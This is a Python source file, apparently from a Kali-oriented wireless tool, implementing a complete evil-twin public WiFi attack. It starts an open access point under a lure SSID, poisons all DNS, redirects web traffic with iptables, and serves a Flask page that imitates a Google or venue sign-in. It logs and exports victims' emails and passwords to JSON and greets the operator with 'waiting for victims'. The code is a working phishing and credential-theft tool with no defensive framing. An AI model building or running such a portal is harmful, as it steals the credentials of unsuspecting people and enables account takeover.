"""
core/captive_portal.py
======================
Módulo de Captive Portal (Evil Twin Público)
-------------------------------------------
Simula una red WiFi pública de tipo "FreeMallWiFi" que al conectarse
muestra una página de login (estilo Google, genérico o venue) para
capturar credenciales del usuario.

Stack técnico:
  - hostapd    → AP abierto (sin contraseña) con el SSID elegido
  - dnsmasq    → DHCP  + DNS poisoning (responde 10.0.0.1 a cualquier host)
  - iptables   → redirige TCP/80 y TCP/443 al servidor web local
  - Flask      → sirve la página de phishing y recoge las credenciales

Requisitos en Kali:
  sudo apt install hostapd dnsmasq python3-flask
  (la interfaz debe estar en modo managed, NO en monitor)
"""

import subprocess
import threading
import os
import sys
import time
import signal
import json
import re
from datetime import datetime

WIRETRAP_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, WIRETRAP_DIR)

# Ruta base de plantillas HTML
TEMPLATES_DIR = os.path.join(WIRETRAP_DIR, "gui", "templates")


# ── Configuración de red del portal ─────────────────────────────

GATEWAY_IP   = "10.0.0.1"
DHCP_START   = "10.0.0.10"
DHCP_END     = "10.0.0.100"
SUBNET_MASK  = "255.255.255.0"
FLASK_PORT   = 80


# ── Plantilla HTML embebida (fallback si no existe el archivo) ───

_PORTAL_HTML_GOOGLE = """<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Conectarse a la Red – Iniciar sesión con Google</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: 'Segoe UI', Arial, sans-serif;
    background: #f2f2f2;
    display: flex; align-items: center; justify-content: center;
    min-height: 100vh;
  }
  .card {
    background: white;
    border-radius: 8px;
    box-shadow: 0 2px 10px rgba(0,0,0,.15);
    width: 360px;
    padding: 40px 36px 36px;
    text-align: center;
  }
  .google-logo { font-size: 28px; color: #5f6368; font-weight: 300; letter-spacing:-1px; margin-bottom: 28px; }
  .google-logo span.G { color:#4285F4; }
  .google-logo span.o1 { color:#EA4335; }
  .google-logo span.o2 { color:#FBBC05; }
  .google-logo span.g { color:#34A853; }
  .google-logo span.l { color:#4285F4; }
  .google-logo span.e { color:#EA4335; }
  h2 { font-size: 24px; color: #202124; font-weight: 400; margin-bottom: 8px; }
  p.sub { color: #5f6368; font-size: 14px; margin-bottom: 28px; }
  input[type=email], input[type=password] {
    width: 100%; border: 1px solid #dadce0; border-radius: 4px;
    padding: 13px 14px; font-size: 15px; outline: none;
    margin-bottom: 16px; color: #202124;
  }
  input:focus { border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,.2); }
  .links { text-align: left; margin-bottom: 24px; }
  .links a { color: #1a73e8; font-size: 13px; text-decoration: none; }
  .btn-next {
    background: #1a73e8; color: white; border: none; border-radius: 4px;
    padding: 10px 24px; font-size: 14px; font-weight: 500; cursor: pointer;
    float: right;
  }
  .btn-next:hover { background: #1765c7; }
  .btn-row { display: flex; justify-content: space-between; align-items: center; }
  .create-link a { color: #1a73e8; font-size: 13px; text-decoration: none; font-weight: 500; }
  .footer { margin-top: 30px; font-size: 11px; color: #5f6368; }
  .info-bar {
    background: #fff3cd; border: 1px solid #ffc107; border-radius: 4px;
    padding: 8px 12px; font-size: 12px; color: #856404; margin-bottom: 20px;
    text-align: left;
  }
</style>
</head>
<body>
<div class="card">
  <div class="google-logo">
    <span class="G">G</span><span class="o1">o</span><span class="o2">o</span><span class="g">g</span><span class="l">l</span><span class="e">e</span>
  </div>
  <h2>Iniciar sesión</h2>
  <p class="sub">para continuar en {{ venue }}</p>
  <div class="info-bar">
    🔒 Conexión gratuita a la red WiFi pública.
    Se requiere autenticación para acceder a Internet.
  </div>
  <form method="POST" action="/login">
    <input id="email" name="email" type="email"
           placeholder="Correo electrónico o teléfono" required autofocus>
    <div class="links"><a href="#">¿Olvidaste tu correo?</a></div>
    <input id="password" name="password" type="password"
           placeholder="Contraseña" required>
    <div class="links"><a href="#">¿Olvidaste tu contraseña?</a></div>
    <div class="btn-row">
      <div class="create-link"><a href="#">Crear cuenta</a></div>
      <button class="btn-next" type="submit">Siguiente</button>
    </div>
  </form>
  <div class="footer">Español (España) • Ayuda • Privacidad • Términos</div>
</div>
</body>
</html>
"""

_PORTAL_HTML_VENUE = """<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{{ venue }} WiFi – Acceso Gratuito</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: 'Segoe UI', Arial, sans-serif;
    background: linear-gradient(135deg,#1a1a2e,#16213e);
    display: flex; align-items: center; justify-content: center;
    min-height: 100vh;
  }
  .card {
    background: white; border-radius: 12px;
    box-shadow: 0 4px 24px rgba(0,0,0,.4);
    width: 380px; padding: 40px;
  }
  h1 { font-size: 22px; color: #1a1a2e; text-align: center; margin-bottom: 6px; }
  p.sub { color: #666; font-size: 13px; text-align: center; margin-bottom: 28px; }
  label { font-size: 13px; color: #333; font-weight: 600; display: block; margin-bottom: 6px; }
  input[type=email], input[type=password], input[type=text] {
    width:100%; border:1px solid #ddd; border-radius:6px;
    padding:12px 14px; font-size:14px; margin-bottom:18px;
  }
  input:focus { outline:none; border-color:#4285F4; }
  .btn-access {
    width:100%; background:#e94560; color:white; border:none;
    border-radius:6px; padding:13px; font-size:15px; font-weight:600;
    cursor:pointer; margin-top:4px;
  }
  .btn-access:hover { background:#c73652; }
  .wifi-icon { font-size:40px; text-align:center; margin-bottom:20px; }
  .terms { font-size:11px; color:#999; text-align:center; margin-top:18px; }
  .divider { border:none; border-top:1px solid #eee; margin:20px 0; }
  .social-btn {
    width:100%; border:1px solid #ddd; background:white;
    border-radius:6px; padding:11px; font-size:14px;
    cursor:pointer; display:flex; align-items:center; gap:10px;
    margin-bottom:10px;
  }
</style>
</head>
<body>
<div class="card">
  <div class="wifi-icon">📶</div>
  <h1>{{ venue }} – WiFi Gratis</h1>
  <p class="sub">Inicia sesión para navegar sin límites</p>
  <form method="POST" action="/login">
    <label>Email o teléfono</label>
    <input name="email" type="email" placeholder="usuario@ejemplo.com" required autofocus>
    <label>Contraseña</label>
    <input name="password" type="password" placeholder="••••••••" required>
    <button class="btn-access" type="submit">🔓 Acceder a Internet</button>
  </form>
  <hr class="divider">
  <button class="social-btn" onclick="document.querySelector('[name=email]').form.submit()">
    <img src="https://www.google.com/favicon.ico" width="18" onerror="this.style.display='none'">
    Continuar con Google
  </button>
  <button class="social-btn">
    📘 Continuar con Facebook
  </button>
  <div class="terms">
    Al conectarte aceptas nuestros <a href="#">Términos y Condiciones</a>
    y la <a href="#">Política de Privacidad</a>.
  </div>
</div>
</body>
</html>
"""

_PORTAL_HTML_SUCCESS = """<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="refresh" content="3;url=https://www.google.com">
<title>Conectado</title>
<style>
  body { font-family:Arial,sans-serif; background:#f2f2f2;
         display:flex; align-items:center; justify-content:center; height:100vh; }
  .box { background:white; border-radius:8px; padding:40px; text-align:center;
         box-shadow:0 2px 10px rgba(0,0,0,.1); }
  h2 { color:#34A853; font-size:22px; margin-bottom:10px; }
  p { color:#5f6368; font-size:14px; }
</style>
</head>
<body>
<div class="box">
  <h2>✅ ¡Conectado!</h2>
  <p>Ahora tienes acceso a Internet.</p>
  <p>Redirigiendo...</p>
</div>
</body>
</html>
"""


# ── Flask app ────────────────────────────────────────────────────

def _build_flask_app(template_type: str, venue_name: str, creds_log: list,
                     on_credential=None):
    """
    Construye y devuelve la aplicación Flask con las rutas del portal.
    Se importa Flask aquí para no romper si no está instalado.
    """
    try:
        from flask import Flask, request, redirect, make_response
    except ImportError:
        return None

    app = Flask(__name__, template_folder=TEMPLATES_DIR)
    app.secret_key = os.urandom(16)

    # Seleccionar plantilla
    if template_type == "google":
        html_template = _PORTAL_HTML_GOOGLE
    else:
        html_template = _PORTAL_HTML_VENUE

    # Reemplazar {{ venue }} en la plantilla
    portal_html = html_template.replace("{{ venue }}", venue_name)

    @app.route("/", defaults={"path": ""})
    @app.route("/<path:path>")
    def catch_all(path):
        # iOS / macOS detecta captive portal vía estos endpoints:
        if path in ("hotspot-detect.html", "library/test/success.html",
                    "generate_204", "connecttest.txt", "ncsi.txt",
                    "canonical.html", "redirect"):
            # Devolver respuesta que indica "hay portal" (no OK)
            return make_response(portal_html, 200)
        return make_response(portal_html, 200)

    @app.route("/login", methods=["POST"])
    def login():
        email    = request.form.get("email", "").strip()
        password = request.form.get("password", "").strip()
        ip       = request.remote_addr
        ts       = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        entry = {
            "timestamp": ts,
            "ip":        ip,
            "email":     email,
            "password":  password,
        }
        creds_log.append(entry)

        # Callback a la GUI
        if on_credential:
            on_credential(entry)

        # Mostrar página de éxito (no dar internet real)
        return make_response(_PORTAL_HTML_SUCCESS, 200)

    @app.route("/favicon.ico")
    def favicon():
        return "", 204

    return app


# ── Clase principal ──────────────────────────────────────────────

class CaptivePortal:
    """
    Levanta un AP abierto + DHCP + DNS poisoning + portal de phishing.

    Uso típico:
        cp = CaptivePortal("wlan0")
        cp.on_credential = lambda e: print(e)
        cp.start(ssid="MallWiFi", template="google", venue="Centro Comercial")
        ...
        cp.stop()
    """

    def __init__(self, interface: str):
        self.interface = interface
        self.running   = False

        # Configuración
        self.ssid          = "FreeWiFi"
        self.channel       = 6
        self.venue_name    = "Portal WiFi"
        self.template_type = "google"   # "google" | "venue"

        # Credenciales capturadas
        self.captured_creds: list[dict] = []

        # Rutas de archivos temporales
        self._hostapd_conf  = "/tmp/wt_cp_hostapd.conf"
        self._dnsmasq_conf  = "/tmp/wt_cp_dnsmasq.conf"
        self._dnsmasq_pid   = "/tmp/wt_cp_dnsmasq.pid"
        self._hostapd_pid   = "/tmp/wt_cp_hostapd.pid"

        # Subprocesos
        self._hostapd_proc  = None
        self._dnsmasq_proc  = None
        self._flask_thread  = None
        self._flask_server  = None

        # Callbacks GUI
        self.on_started    = None   # fn()
        self.on_stopped    = None   # fn()
        self.on_error      = None   # fn(str)
        self.on_credential = None   # fn(dict)
        self.on_log        = None   # fn(str)

    # ── Utilidades internas ──────────────────────────────────────

    def _log(self, msg: str):
        if self.on_log:
            self.on_log(msg)

    def _err(self, msg: str):
        if self.on_error:
            self.on_error(msg)

    @staticmethod
    def _hw_mode(channel: int) -> str:
        return "a" if channel >= 36 else "g"

    def _write_hostapd_conf(self):
        hw = self._hw_mode(self.channel)
        conf = (
            f"interface={self.interface}\n"
            f"driver=nl80211\n"
            f"ssid={self.ssid}\n"
            f"hw_mode={hw}\n"
            f"channel={self.channel}\n"
            f"auth_algs=1\n"
            f"wpa=0\n"             # ABIERTO — sin contraseña
            f"ignore_broadcast_ssid=0\n"
            f"ieee80211n=1\n"
            f"wmm_enabled=1\n"
        )
        with open(self._hostapd_conf, "w") as f:
            f.write(conf)
        self._log(f"hostapd.conf escrito → {self._hostapd_conf}")

    def _write_dnsmasq_conf(self):
        conf = (
            f"interface={self.interface}\n"
            f"bind-interfaces\n"
            f"dhcp-range={DHCP_START},{DHCP_END},{SUBNET_MASK},12h\n"
            f"dhcp-option=3,{GATEWAY_IP}\n"   # gateway
            f"dhcp-option=6,{GATEWAY_IP}\n"   # DNS → nosotros
            f"address=/#/{GATEWAY_IP}\n"       # DNS poisoning total
            f"log-dhcp\n"
            f"no-resolv\n"
        )
        with open(self._dnsmasq_conf, "w") as f:
            f.write(conf)
        self._log(f"dnsmasq.conf escrito → {self._dnsmasq_conf}")

    def _configure_interface(self):
        """Asigna IP gateway a la interfaz y la activa."""
        subprocess.run(["ip", "link", "set", self.interface, "up"],
                       capture_output=True)
        # Borrar IPs previas y asignar la nuestra
        subprocess.run(["ip", "addr", "flush", "dev", self.interface],
                       capture_output=True)
        subprocess.run(["ip", "addr", "add", f"{GATEWAY_IP}/24",
                        "dev", self.interface], capture_output=True)
        self._log(f"Interfaz {self.interface} → {GATEWAY_IP}/24")

    def _setup_iptables(self):
        """Redirige todo HTTP/HTTPS al servidor Flask local."""
        iface = self.interface

        # Limpiar reglas anteriores (solo las nuestras)
        subprocess.run(["iptables", "-F"], capture_output=True)
        subprocess.run(["iptables", "-t", "nat", "-F"], capture_output=True)

        # Permitir loopback
        subprocess.run(["iptables", "-A", "INPUT", "-i", "lo", "-j", "ACCEPT"],
                       capture_output=True)

        # Permitir DHCP + DNS
        subprocess.run(["iptables", "-A", "INPUT", "-i", iface,
                        "-p", "udp", "--dport", "53", "-j", "ACCEPT"],
                       capture_output=True)
        subprocess.run(["iptables", "-A", "INPUT", "-i", iface,
                        "-p", "udp", "--dport", "67", "-j", "ACCEPT"],
                       capture_output=True)

        # Permitir acceso al portal web (puerto 80 local)
        subprocess.run(["iptables", "-A", "INPUT", "-i", iface,
                        "-p", "tcp", "--dport", "80", "-j", "ACCEPT"],
                       capture_output=True)

        # Redirigir HTTP → portal local
        subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING",
                        "-i", iface, "-p", "tcp", "--dport", "80",
                        "-j", "DNAT", f"--to-destination={GATEWAY_IP}:{FLASK_PORT}"],
                       capture_output=True)

        # Redirigir HTTPS → portal local (port 80, sin TLS — el cliente verá
        # un error de certificado pero la mayoría de captive portals lo hace así)
        subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING",
                        "-i", iface, "-p", "tcp", "--dport", "443",
                        "-j", "DNAT", f"--to-destination={GATEWAY_IP}:{FLASK_PORT}"],
                       capture_output=True)

        # Bloquear el resto del tráfico hacia Internet (no damos acceso real)
        subprocess.run(["iptables", "-A", "FORWARD", "-i", iface, "-j", "DROP"],
                       capture_output=True)

        self._log("iptables configurado: HTTP/HTTPS → portal local")

    def _clear_iptables(self):
        subprocess.run(["iptables", "-F"], capture_output=True)
        subprocess.run(["iptables", "-t", "nat", "-F"], capture_output=True)
        self._log("iptables limpiado")

    def _start_hostapd(self) -> bool:
        try:
            self._hostapd_proc = subprocess.Popen(
                ["hostapd", self._hostapd_conf],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT
            )
            # Esperar un momento y comprobar que sigue vivo
            time.sleep(2)
            if self._hostapd_proc.poll() is not None:
                out = self._hostapd_proc.stdout.read().decode(errors="ignore")
                self._err(f"hostapd terminó prematuramente:\n{out}")
                return False
            self._log(f"hostapd arrancado (PID {self._hostapd_proc.pid})")
            return True
        except FileNotFoundError:
            self._err("hostapd no encontrado. Instálalo: sudo apt install hostapd")
            return False
        except Exception as e:
            self._err(f"Error iniciando hostapd: {e}")
            return False

    def _start_dnsmasq(self) -> bool:
        try:
            # Matar instancias previas
            subprocess.run(["pkill", "-f", "wt_cp_dnsmasq"], capture_output=True)
            time.sleep(0.5)

            self._dnsmasq_proc = subprocess.Popen(
                ["dnsmasq", "-C", self._dnsmasq_conf,
                 "--no-daemon", "--pid-file=" + self._dnsmasq_pid],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT
            )
            time.sleep(1)
            if self._dnsmasq_proc.poll() is not None:
                out = self._dnsmasq_proc.stdout.read().decode(errors="ignore")
                self._err(f"dnsmasq terminó prematuramente:\n{out}")
                return False
            self._log(f"dnsmasq arrancado (PID {self._dnsmasq_proc.pid})")
            return True
        except FileNotFoundError:
            self._err("dnsmasq no encontrado. Instálalo: sudo apt install dnsmasq")
            return False
        except Exception as e:
            self._err(f"Error iniciando dnsmasq: {e}")
            return False

    def _start_flask(self):
        """Arranca Flask en un thread daemon."""
        try:
            from flask import Flask
        except ImportError:
            self._err("Flask no encontrado. Instálalo: sudo apt install python3-flask  "
                      "o  pip3 install flask --break-system-packages")
            return False

        app = _build_flask_app(
            template_type=self.template_type,
            venue_name=self.venue_name,
            creds_log=self.captured_creds,
            on_credential=self._on_new_credential
        )
        if app is None:
            self._err("No se pudo construir la app Flask.")
            return False

        def run_flask():
            try:
                import logging as _log
                _log.getLogger("werkzeug").setLevel(_log.ERROR)
                app.run(host=GATEWAY_IP, port=FLASK_PORT, threaded=True,
                        use_reloader=False, debug=False)
            except Exception as ex:
                self._err(f"Flask error: {ex}")

        self._flask_thread = threading.Thread(target=run_flask, daemon=True)
        self._flask_thread.start()
        self._log(f"Flask portal corriendo en http://{GATEWAY_IP}:{FLASK_PORT}")
        return True

    def _on_new_credential(self, entry: dict):
        """Llamado desde Flask cuando llega un submit."""
        self.captured_creds.append(entry)
        self._log(
            f"[!] CREDENCIAL CAPTURADA  "
            f"IP={entry['ip']}  "
            f"email={entry['email']}  "
            f"pass={entry['password']}"
        )
        if self.on_credential:
            self.on_credential(entry)

    # ── API pública ──────────────────────────────────────────────

    def start(self, ssid: str = "FreeWiFi", channel: int = 6,
              template: str = "google", venue: str = "Portal WiFi"):
        """
        Arranca el ataque.

        Args:
            ssid:     SSID del AP falso (p.ej. "MallWiFi_FREE")
            channel:  Canal 802.11 (1–13 para 2.4 GHz)
            template: "google" | "venue"
            venue:    Nombre del lugar que aparece en la página
        """
        if self.running:
            self._log("Ya está en ejecución.")
            return

        self.ssid          = ssid
        self.channel       = max(1, min(13, channel))
        self.template_type = template
        self.venue_name    = venue
        self.captured_creds.clear()

        self._log("=== Iniciando Captive Portal ===")
        self._log(f"  SSID     : {self.ssid}")
        self._log(f"  Canal    : {self.channel}")
        self._log(f"  Plantilla: {self.template_type}")
        self._log(f"  Venue    : {self.venue_name}")

        # 1. Escribir configs
        self._write_hostapd_conf()
        self._write_dnsmasq_conf()

        # 2. Configurar interfaz
        self._configure_interface()

        # 3. Arrancar hostapd
        if not self._start_hostapd():
            self._cleanup()
            return

        # 4. Arrancar dnsmasq
        if not self._start_dnsmasq():
            self._cleanup()
            return

        # 5. iptables
        self._setup_iptables()

        # 6. Flask
        if not self._start_flask():
            self._cleanup()
            return

        self.running = True
        self._log("=== Portal Cautivo ACTIVO — Esperando víctimas ===")
        if self.on_started:
            self.on_started()

    def stop(self):
        """Detiene todo y limpia el sistema."""
        if not self.running and not self._hostapd_proc and not self._dnsmasq_proc:
            return

        self.running = False
        self._log("Deteniendo Captive Portal...")

        # Matar hostapd
        if self._hostapd_proc:
            try:
                self._hostapd_proc.terminate()
                self._hostapd_proc.wait(timeout=3)
            except Exception:
                try: self._hostapd_proc.kill()
                except Exception: pass
            self._hostapd_proc = None

        # Matar dnsmasq
        if self._dnsmasq_proc:
            try:
                self._dnsmasq_proc.terminate()
                self._dnsmasq_proc.wait(timeout=3)
            except Exception:
                try: self._dnsmasq_proc.kill()
                except Exception: pass
            self._dnsmasq_proc = None

        # Limpiar iptables
        self._clear_iptables()

        # Bajar la interfaz (no resetear, solo quitar IP)
        subprocess.run(["ip", "addr", "flush", "dev", self.interface],
                       capture_output=True)

        # Borrar configs temporales
        for f in [self._hostapd_conf, self._dnsmasq_conf]:
            try: os.remove(f)
            except FileNotFoundError: pass

        self._log("Captive Portal detenido.")
        if self.on_stopped:
            self.on_stopped()

    def _cleanup(self):
        """Limpieza rápida en caso de error durante el arranque."""
        self.stop()

    def export_credentials(self, path: str | None = None) -> str:
        """
        Exporta las credenciales capturadas a un fichero JSON.
        Devuelve la ruta del fichero generado.
        """
        if not path:
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            path = f"/tmp/wiretrap_creds_{ts}.json"

        with open(path, "w") as f:
            json.dump(self.captured_creds, f, indent=2, ensure_ascii=False)

        self._log(f"Credenciales exportadas → {path}")
        return path


# ── Test de terminal ─────────────────────────────────────────────

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: sudo python3 captive_portal.py <interfaz>")
        print("Ejemplo: sudo python3 captive_portal.py wlan0")
        sys.exit(1)

    iface = sys.argv[1]
    ssid  = sys.argv[2] if len(sys.argv) > 2 else "MallWiFi_FREE"

    cp = CaptivePortal(iface)
    cp.on_log        = lambda m: print(f"[LOG] {m}")
    cp.on_error      = lambda m: print(f"[ERR] {m}")
    cp.on_credential = lambda e: print(f"\n[!!!] CAPTURADO: {e}\n")

    cp.start(ssid=ssid, channel=6, template="google", venue="Centro Comercial")

    try:
        while cp.running:
            time.sleep(1)
    except KeyboardInterrupt:
        cp.stop()
        if cp.captured_creds:
            out = cp.export_credentials()
            print(f"\nCredenciales guardadas en: {out}")
